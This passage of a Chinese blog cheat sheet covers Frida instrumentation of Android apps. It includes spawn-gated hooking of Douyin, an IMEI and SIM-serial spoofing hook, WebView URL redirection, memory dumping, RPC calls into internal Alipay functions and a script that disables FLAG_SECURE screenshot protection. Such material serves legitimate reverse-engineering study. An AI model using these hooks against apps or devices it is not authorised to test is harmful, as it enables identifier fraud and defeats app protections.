class="line">event = threading.Event()</span><br><span class="line"></span><br><span class="line">jscode = &quot;&quot;&quot;</span><br><span class="line">Java.perform(function() &#123;</span><br><span class="line">    //your js code</span><br><span class="line">&#125;)</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">def spawn_added(spawn):</span><br><span class="line">    </span><br><span class="line">    event.set()</span><br><span class="line">    if(spawn.identifier.startswith(&apos;com.ss.android.ugc.aweme&apos;)):</span><br><span class="line">        print(&apos;spawn_added:&apos;, spawn)</span><br><span class="line">        session = device.attach(spawn.pid)</span><br><span class="line">        script = session.create_script(jscode)</span><br><span class="line">        script.on(&apos;message&apos;, on_message)</span><br><span class="line">        script.load()</span><br><span class="line">        device.resume(spawn.pid)</span><br><span class="line">        </span><br><span class="line">def spawn_removed(spawn):</span><br><span class="line">    print(&apos;spawn_removed:&apos;, spawn)</span><br><span class="line">    event.set()</span><br><span class="line"></span><br><span class="line">def on_message(spawn, message, data):</span><br><span class="line">    print(&apos;on_message:&apos;, spawn, message, data)</span><br><span class="line">    </span><br><span class="line">def on_message(message, data):</span><br><span class="line">    if message[&apos;type&apos;] == &apos;send&apos;:</span><br><span class="line">        print(&quot;[*] &#123;0&#125;&quot;.format(message[&apos;payload&apos;]))</span><br><span class="line">    else:</span><br><span class="line">        print(message)</span><br><span class="line"></span><br><span class="line">device.on(&apos;spawn-added&apos;, spawn_added)</span><br><span class="line">device.on(&apos;spawn-removed&apos;, spawn_removed)</span><br><span class="line"></span><br><span class="line">device.enable_spawn_gating()</span><br><span class="line"></span><br><span class="line">event = threading.Event()</span><br><span class="line">print(&apos;Enabled spawn gating&apos;)</span><br><span class="line"></span><br><span class="line">pid = device.spawn([&quot;com.ss.android.ugc.aweme&quot;])</span><br><span class="line"></span><br><span class="line">session = device.attach(pid)</span><br><span class="line">print(&quot;[*] Attach Application id:&quot;,pid)</span><br><span class="line">device.resume(pid)</span><br><span class="line">sys.stdin.read()</span><br></pre></td></tr></table></figure></p><h3 id="3-同名函数返回值不同"><a href="#3-同名函数返回值不同" class="headerlink" title="3. 同名函数返回值不同"></a>3. 同名函数返回值不同</h3><p>hook中可能出现“函数名参数完全相同，但返回值不同的情况”，这种情况frida暂时无法实现，测试此情况代码编译不会通过，但编译后可以改bytecode，不影响执行结果</p><ul><li>这种情况可以枚举函数的overloads属性，挨个hook，或者使用数组索引hook,例如a.overloads[1].implement=xxxx</li></ul><h3 id="4-使用enumerateLoadedClasses报“VM-GetEnv-failed”错误"><a href="#4-使用enumerateLoadedClasses报“VM-GetEnv-failed”错误" class="headerlink" title="4. 使用enumerateLoadedClasses报“VM::GetEnv failed”错误"></a>4. 使用enumerateLoadedClasses报“VM::GetEnv failed”错误</h3><p>enumerateLoadedClasses需要在Java.perform（）下使用，参考<a href="https://github.com/frida/frida/issues/237" target="_blank" rel="noopener">https://github.com/frida/frida/issues/237</a></p><h3 id="5-app没有入口，无法使用spawn"><a href="#5-app没有入口，无法使用spawn" class="headerlink" title="5. app没有入口，无法使用spawn"></a>5. app没有入口，无法使用spawn</h3><p>Failed to spawn: unable to find application with identifier ‘com.dzvuhumnjt.kfwmalytfds’<br>如果包名是正确的，应该是这个包名是一个服务，没有lunch activity, 此时只能靠启动后抢时间的方式来attach, spawn行不通</p><h3 id="6-判断一个函数是public还是privte"><a href="#6-判断一个函数是public还是privte" class="headerlink" title="6. 判断一个函数是public还是privte"></a>6. 判断一个函数是public还是privte</h3><p>反射出 method 类来调getModifiers()</p><h3 id="7-Magisk-Hide"><a href="#7-Magisk-Hide" class="headerlink" title="7. Magisk Hide"></a>7. Magisk Hide</h3><p>unable to access process with pid 1204 due to system restrictions; try <code>sudo sysctl kernel.yama.ptrace_scope=0</code>, or run Frida as root<br>magisk 里面的一个叫magisk hide的东西会妨碍frida的进程，关掉这个即可</p><h3 id="8-明明有这个函数却hook不了，即使自己调用也无法触发"><a href="#8-明明有这个函数却hook不了，即使自己调用也无法触发" class="headerlink" title="8. 明明有这个函数却hook不了，即使自己调用也无法触发"></a>8. 明明有这个函数却hook不了，即使自己调用也无法触发</h3><p>常见于一些final或static函数，系统进行了优化，在开头使用Java.deoptimizeEverything() 强制VM使用其解释器执行所有操作。参考<a href="https://github.com/frida/frida/issues/1298" target="_blank" rel="noopener">https://github.com/frida/frida/issues/1298</a></p><p>例如JIT的内联优化（method lining）会根据调用频次决定是否走解释执行，也会出现这种情况。</p><p>解决方案：<br>adb shell setprop dalvik.vm.usejit false (关闭JIT)<br>adb shell cmd package compile –reset com.tencent.mm (清除配置文件数据并移除经过编译的代码)</p><p>参考<a href="https://github.com/frida/frida/issues/817" target="_blank" rel="noopener">https://github.com/frida/frida/issues/817</a><br><a href="https://source.android.google.cn/devices/tech/dalvik/jit-compiler" target="_blank" rel="noopener">https://source.android.google.cn/devices/tech/dalvik/jit-compiler</a></p><h2 id="六、-Frida基础数据类型"><a href="#六、-Frida基础数据类型" class="headerlink" title="六、 Frida基础数据类型"></a>六、 Frida基础数据类型</h2><p>为以后写脚本时方便，这里列举下常用的类型：</p><h3 id="Int"><a href="#Int" class="headerlink" title="Int"></a>Int</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var Integerclass = Java.use(&quot;java.lang.Integer&quot;);</span><br><span class="line">var myint = Integerclass.$new(1440);</span><br></pre></td></tr></table></figure><h3 id="Long"><a href="#Long" class="headerlink" title="Long"></a>Long</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var Longclass = Java.use(&quot;java.lang.Long&quot;);</span><br><span class="line">var myint = Longclass.$new(27893952512)</span><br></pre></td></tr></table></figure><h3 id="Bool"><a href="#Bool" class="headerlink" title="Bool"></a>Bool</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Java.use(&quot;java.lang.Boolean&quot;).$new(true);</span><br></pre></td></tr></table></figure><h3 id="ByteArray"><a href="#ByteArray" class="headerlink" title="ByteArray"></a>ByteArray</h3><ol><li><p>js传给python</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">// js中send（byte[]数组）</span><br><span class="line">def on_message(message, data):</span><br><span class="line">    if message[&apos;type&apos;] == &apos;send&apos;:</span><br><span class="line">        data = message[&apos;payload&apos;]</span><br><span class="line">        for i in range(len(data)):</span><br><span class="line">        data[i] = data[i] &amp; 0xff</span><br><span class="line">        open(&quot;tmp&quot;,&apos;wb&apos;).write(bytearray(data))</span><br><span class="line">    else:</span><br><span class="line">    pass</span><br></pre></td></tr></table></figure></li><li><p>python传给js</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var a = Java.array(&apos;byte&apos;, [ 0xac,0x37,0x43,0x4f,0xaf,0xa8]);</span><br></pre></td></tr></table></figure></li></ol><h3 id="遍历map"><a href="#遍历map" class="headerlink" title="遍历map"></a>遍历map</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">var mapcls = Java.use(&quot;java.util.Map&quot;);</span><br><span class="line">var mymap = Java.cast(a1, mapcls);</span><br><span class="line">var result = &quot;&quot;;</span><br><span class="line">var keyset = mymap.keySet();</span><br><span class="line">var it = keyset.iterator();</span><br><span class="line">while(it.hasNext())&#123;</span><br><span class="line">    var keystr = it.next().toString();</span><br><span class="line">    var valuestr = mymap.get(keystr).toString();</span><br><span class="line">    result += keystr+&quot;:&quot;+valuestr+&quot; &quot;;</span><br><span class="line">&#125;</span><br><span class="line">console.log(result);</span><br></pre></td></tr></table></figure><h2 id="七、-Frida-Hook实例"><a href="#七、-Frida-Hook实例" class="headerlink" title="七、 Frida Hook实例"></a>七、 Frida Hook实例</h2><p>以下为我曾经用过或自己实现的frida脚本，根据不同的使用场景进行了分类。</p><h3 id="1-打印hook函数的返回值"><a href="#1-打印hook函数的返回值" class="headerlink" title="1. 打印hook函数的返回值"></a>1. 打印hook函数的返回值</h3><pre><code>直接运行一遍原函数，将结果赋值给一个新变量，输出并return新变量即可，例如：</code></pre><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> cls = Java.use(<span class="string">"com.tencent.mm.sdk.platformtools.w"</span>);</span><br><span class="line">    cls.w.overload(<span class="string">"java.lang.String"</span>,<span class="string">"java.lang.String"</span>).implementation=<span class="function"><span class="keyword">function</span>(<span class="params">p1,p2</span>)</span>&#123;</span><br><span class="line">   <span class="keyword">var</span> req = <span class="keyword">this</span>.w(p1,p2);</span><br><span class="line">       <span class="built_in">console</span>.log(req);</span><br><span class="line">       <span class="keyword">return</span> req;</span><br><span class="line">&#125;;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="2-hook重载函数"><a href="#2-hook重载函数" class="headerlink" title="2. hook重载函数"></a>2. hook重载函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cls.loadUrl.overload(&quot;java.lang.String&quot;).implementation = function(param)……</span><br><span class="line">cls.loadUrl.overload(&quot;java.lang.String&quot;,&quot;java.util.Map&quot;).implementation=</span><br></pre></td></tr></table></figure><h3 id="3-打印java函数的调用栈"><a href="#3-打印java函数的调用栈" class="headerlink" title="3. 打印java函数的调用栈"></a>3. 打印java函数的调用栈</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">var Exc = Java.use(&quot;java.lang.Exception&quot;);</span><br><span class="line">var Log = Java.use(&quot;android.util.Log&quot;);</span><br><span class="line">xxxx.implementation = function(param)&#123;</span><br><span class="line">    var e = Exc.$new(&quot;&quot;);</span><br><span class="line">var log = Log.$new();</span><br><span class="line">console.log(log.getStackTraceString(e));</span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure><p>或<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">console.log(Java.use(&quot;android.util.Log&quot;).getStackTraceString(Java.use(&quot;java.lang.Exception&quot;).$new()))</span><br></pre></td></tr></table></figure></p><h3 id="4-打印native函数调用栈"><a href="#4-打印native函数调用栈" class="headerlink" title="4. 打印native函数调用栈"></a>4. 打印native函数调用栈</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="string">"begin===="</span>);</span><br><span class="line"><span class="keyword">var</span> libavmp = Module.findBaseAddress(<span class="string">"libsgavmpso-6.4.20.so"</span>);</span><br><span class="line"><span class="keyword">var</span> func = ptr(<span class="built_in">parseInt</span>(libavmp)+<span class="number">0x1ea</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"libavmp base: "</span>+libavmp);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"function base: "</span>+func);</span><br><span class="line">Interceptor.attach(func, &#123;</span><br><span class="line">    onEnter: <span class="function"><span class="keyword">function</span>(<span class="params">args</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(Thread.backtrace(<span class="keyword">this</span>.context,Backtracer.ACCURATE).map(DebugSymbol.fromAddress).join(<span class="string">" "</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;,</span><br><span class="line">    onLeave:<span class="function"><span class="keyword">function</span>(<span class="params">retval</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"retval: "</span>+retval);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="5-dump内存"><a href="#5-dump内存" class="headerlink" title="5. dump内存"></a>5. dump内存</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var data = Memory.readByteArray(ptr(0x824a9000), 159744);</span><br><span class="line">console.log(&#123;type: &apos;data-for-you&apos; &#125;, data);</span><br></pre></td></tr></table></figure><h3 id="6-Hook-Android-IMEI"><a href="#6-Hook-Android-IMEI" class="headerlink" title="6. Hook Android IMEI"></a>6. Hook Android IMEI</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Java.perform(function () &#123;</span><br><span class="line">var TM = Java.use(&quot;android.telephony.TelephonyManager&quot;);</span><br><span class="line">console.log(&quot;hook start...&quot;);</span><br><span class="line"></span><br><span class="line">   TM.getSimSerialNumber.overload().implementation = function () &#123;</span><br><span class="line">               console.log(&quot;Called - getSimSerialNumber(String)&quot;);</span><br><span class="line">               var temp = this.getSimSerialNumber();</span><br><span class="line">               console.log(temp);</span><br><span class="line">               return &quot;123456789&quot;;</span><br><span class="line">           &#125;;</span><br><span class="line"></span><br><span class="line">   TM.getDeviceId.overload().implementation = function () &#123;</span><br><span class="line">               console.log(&quot;Called - deviceID()&quot;);</span><br><span class="line">               var temp = this.getDeviceId();</span><br><span class="line">               console.log(temp);</span><br><span class="line">               return &quot;867979021642856&quot;;</span><br><span class="line">           &#125;;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="7-Hook-Android-webview-http请求"><a href="#7-Hook-Android-webview-http请求" class="headerlink" title="7. Hook Android webview http请求"></a>7. Hook Android webview http请求</h3><p>主要针对以下webview中的以下函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">- loadUrl(String url)   </span><br><span class="line">- loadUrl(String url, Map&lt;String, String&gt; additionalHttpHeaders)</span><br><span class="line">- loadData(String data, String mimeType, String encoding)</span><br><span class="line">- loadDataWithBaseURL(String baseUrl, String data, String mimeType, String encoding, String historyUrl)</span><br><span class="line">- postUrl(String url, byte[] postData)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">Java.perform(function () &#123;</span><br><span class="line">var cls = Java.use(&quot;android.webkit.WebView&quot;);</span><br><span class="line">console.log(&quot;class start:------------------&quot;); </span><br><span class="line"></span><br><span class="line">cls.loadUrl.overload(&quot;java.lang.String&quot;).implementation = function(param)&#123;</span><br><span class="line">    console.log(&quot;loadUrl hooked &quot;+param);</span><br><span class="line">    this.loadUrl(&quot;file:///sdcard/1.html&quot;);</span><br><span class="line">   &#125;;</span><br><span class="line"></span><br><span class="line">cls.loadUrl.overload(&quot;java.lang.String&quot;,&quot;java.util.Map&quot;).implementation = function(p1,p2)&#123;</span><br><span class="line">    console.log(&quot;loadUrl2 hooked&quot;+p1 + p2);</span><br><span class="line">    this.loadUrl(&quot;file:///sdcard/1.html&quot;,null);</span><br><span class="line">   &#125;;</span><br><span class="line"></span><br><span class="line">cls.loadDataWithBaseURL.implementation = function(p1,p2,p3,p4,p5)&#123;</span><br><span class="line">   console.log(&quot;loadDataWithBaseURL hooked&quot;+p1 + p2);</span><br><span class="line">   this.loadDataWithBaseURL(&quot;file:///sdcard/1.html&quot;,null,null,null,null);</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cls.postUrl.implementation = function(p1,p2)&#123;</span><br><span class="line">   console.log(&quot;postUrl hooked&quot;+p1);</span><br><span class="line">   this.postUrl(&quot;file:///sdcard/1.html&quot;,null);</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="8-获取context"><a href="#8-获取context" class="headerlink" title="8. 获取context"></a>8. 获取context</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var currentApplication = Java.use(&apos;android.app.ActivityThread&apos;).currentApplication();</span><br><span class="line">var context = currentApplication.getApplicationContext();</span><br></pre></td></tr></table></figure><h3 id="9-创建bundle对象"><a href="#9-创建bundle对象" class="headerlink" title="9. 创建bundle对象"></a>9. 创建bundle对象</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">var bundle = Bundle.$new();</span><br><span class="line">//调用实例方法需要使用call</span><br><span class="line">Bundle.putString.call(bundle,&apos;key1&apos;,&apos;value1&apos;)</span><br><span class="line">//也可以指定具体的参数类型</span><br><span class="line">//Bundle.putString.overload(&apos;java.lang.String&apos;,&apos;java.lang.String&apos;).call(bundle,&apos;key1&apos;,&apos;value1&apos;)</span><br><span class="line">this.getIntent().putExtra(&apos;testBundle&apos;,bundle)</span><br><span class="line">//activity.getIntent().getBundleExtra(&quot;testBundle&quot;);</span><br><span class="line">var outB = this.getIntent().getBundleExtra(&apos;testBundle&apos;)</span><br><span class="line">console.log(outB);</span><br></pre></td></tr></table></figure><h3 id="10-hook-对象"><a href="#10-hook-对象" class="headerlink" title="10. hook 对象"></a>10. hook 对象</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//读取实例对象的属性值，对于得到的对象，需要使用Java.cast()方法转换后才可以使用</span><br><span class="line">// PackageInfo packageInfo = getPackageManager().getPackageInfo(getPackageName(),0);</span><br><span class="line">// String pkg = packageInfo.packageName;</span><br><span class="line">var t = this.getPackageManager().getPackageInfo(this.getPackageName(),0);</span><br><span class="line">var packageInfo = Java.cast(t.$handle, PackageInfo);</span><br><span class="line">var pkg = packageInfo.packageName.value</span><br><span class="line">console.log(pkg)</span><br></pre></td></tr></table></figure><h3 id="11-导出函数并被任意调用"><a href="#11-导出函数并被任意调用" class="headerlink" title="11. 导出函数并被任意调用"></a>11. 导出函数并被任意调用</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">rdev = frida.get_remote_device()</span><br><span class="line">session = rdev.attach(&quot;com.eg.android.AlipayGphone&quot;)</span><br><span class="line"></span><br><span class="line">jscode=&quot;&quot;&quot;</span><br><span class="line">rpc.exports = &#123;</span><br><span class="line">    myfunc: function(aa,bb,cc)&#123;</span><br><span class="line">        Java.perform(function () &#123;</span><br><span class="line">            try&#123;</span><br><span class="line">                classf = Java.use(&apos;com.alipay.android.phone.wallet.sharetoken.service.f&apos;);</span><br><span class="line">                var result = classf.a(aa,bb,cc);//a为static函数</span><br><span class="line">                //f = Hrida.$new(); 非static函数需要new一个实例</span><br><span class="line">                console.log(&quot;myfunc result: &quot;+result);</span><br><span class="line">                return result.toString() </span><br><span class="line"></span><br><span class="line">            &#125;catch(e)&#123;</span><br><span class="line">                console.log(e)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        //return result</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">script = session.create_script(jscode)</span><br><span class="line">script.on(&quot;message&quot;, my_message_handler)</span><br><span class="line">script.load()</span><br><span class="line"></span><br><span class="line">command = &quot;&quot;</span><br><span class="line">while 1 == 1:</span><br><span class="line">    command = raw_input(&quot;Exit: 9999 0: default others: zhikouling&quot;)</span><br><span class="line">    if command == &quot;9999&quot;:</span><br><span class="line">        break</span><br><span class="line">    else:</span><br><span class="line">     a = &quot;b54578ff9d5fcbf6&quot;</span><br><span class="line">     b = None</span><br><span class="line">     c = &quot;快来吱付寳&quot;</span><br><span class="line">     script.exports.myfunc(a,b,c)</span><br></pre></td></tr></table></figure><p>需要获取返回值的情况<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">rpc.exports.foo = function () &#123;</span><br><span class="line">  return new Promise(function (resolve, reject) &#123;</span><br><span class="line">    Java.perform(function () &#123;</span><br><span class="line">      try &#123;</span><br><span class="line">        var result = ...</span><br><span class="line">        resolve(result);</span><br><span class="line">      &#125; catch (e) &#123;</span><br><span class="line">        reject(e);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><h3 id="12-hook构造函数"><a href="#12-hook构造函数" class="headerlink" title="12. hook构造函数"></a>12. hook构造函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">obj.$init.implementation = function ()&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="13-枚举所有加载的类"><a href="#13-枚举所有加载的类" class="headerlink" title="13.枚举所有加载的类"></a>13.枚举所有加载的类</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Java.enumerateLoadedClasses(&#123;</span><br><span class="line">onMatch: function(classname)&#123;</span><br><span class="line">if (classname.indexOf(&quot;XmlPullParser&quot;)&gt;-1)&#123;</span><br><span class="line">console.log(classname);</span><br><span class="line">&#125;</span><br><span class="line">&#125;,</span><br><span class="line"></span><br><span class="line">onComplete: function ()&#123;</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="14-打印函数参数类型"><a href="#14-打印函数参数类型" class="headerlink" title="14.打印函数参数类型"></a>14.打印函数参数类型</h3><p><img src="/images/pasted-195.png" alt="upload successful"></p><h3 id="15-注册一个类-Java-registerClass"><a href="#15-注册一个类-Java-registerClass" class="headerlink" title="15.注册一个类(Java.registerClass)"></a>15.注册一个类(Java.registerClass)</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">Java.perform(function() &#123;</span><br><span class="line">   var FLAG_SECURE = 0x2000;</span><br><span class="line"></span><br><span class="line">   var Runnable = Java.use(&quot;java.lang.Runnable&quot;);</span><br><span class="line">   var DisableSecureRunnable = Java.registerClass(&#123;</span><br><span class="line">      name: &quot;me.bhamza.DisableSecureRunnable&quot;,</span><br><span class="line">      implements: [Runnable],</span><br><span class="line">      fields: &#123;</span><br><span class="line">         activity: &quot;android.app.Activity&quot;,</span><br><span class="line">      &#125;,</span><br><span class="line">      methods: &#123;</span><br><span class="line">         $init: [&#123;</span><br><span class="line">            returnType: &quot;void&quot;,</span><br><span class="line">            argumentTypes: [&quot;android.app.Activity&quot;],</span><br><span class="line">            implementation: function (activity) &#123;</span><br><span class="line">               this.activity.value = activity;</span><br><span class="line">            &#125;</span><br><span class="line">         &#125;],</span><br><span class="line">         run: function() &#123;</span><br><span class="line">            var flags = this.activity.value.getWindow().getAttributes().flags.value; // get current value</span><br><span class="line">            flags &amp;= ~FLAG_SECURE; // toggle it</span><br><span class="line">            this.activity.value.getWindow().setFlags(flags, FLAG_SECURE); // disable it!</span><br><span class="line">            console.log(&quot;Done disabling SECURE flag...&quot;);</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;);</span><br><span class="line"></span><br><span class="line">   Java.choose(&quot;com.example.app.FlagSecureTestActivity&quot;, &#123;</span><br><span class="line">      &quot;onMatch&quot;: function (instance) &#123;</span><br><span class="line">         var runnable = DisableSecureRunnable.$new(instance);</span><br><span class="line">         instance.runOnUiThread(runnable);</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;onComplete&quot;: function () &#123;&#125;</span><br><span class="line">   &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="16-输出一个类的所有field和Method"><a href="#16-输出一个类的所有field和Method" class="headerlink" title="16.输出一个类的所有field和Method"></a>16.输出一个类的所有field和Method</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">const Class = Java.use(&quot;com.Awesome.App.MainActivity&quot;);</span><br><span class="line">function inspectClass(obj) &#123;</span><br><span class="line">    const obj_class = Java.cast(obj.getClass(), Class);</span><br><span class="line">    const fields = obj_class.getDeclaredFields();</span><br><span class="line">    const methods = obj_class.getMethods();</span><br><span class="line">    console.log(&quot;Inspect &quot; + obj.getClass().toString());</span><br><span class="line">    console.log(&quot;\tFields:&quot;);</span><br><span class="line">    for (var i in fields)</span><br><span class="line">        console.log(&quot;\t&quot; + fields[i].toString());</span><br><span class="line">    console.log(&quot;\tMethods:&quot;);</span><br><span class="line">    for (var i in methods)</span><br><span class="line">        console.log(&quot;\t&quot; + methods[i].toString());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="17-修改native函数的返回值"><a href="#17-修改native函数的返回值" class="headerlink" title="17.修改native函数的返回值"></a>17.修改native函数的返回值</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 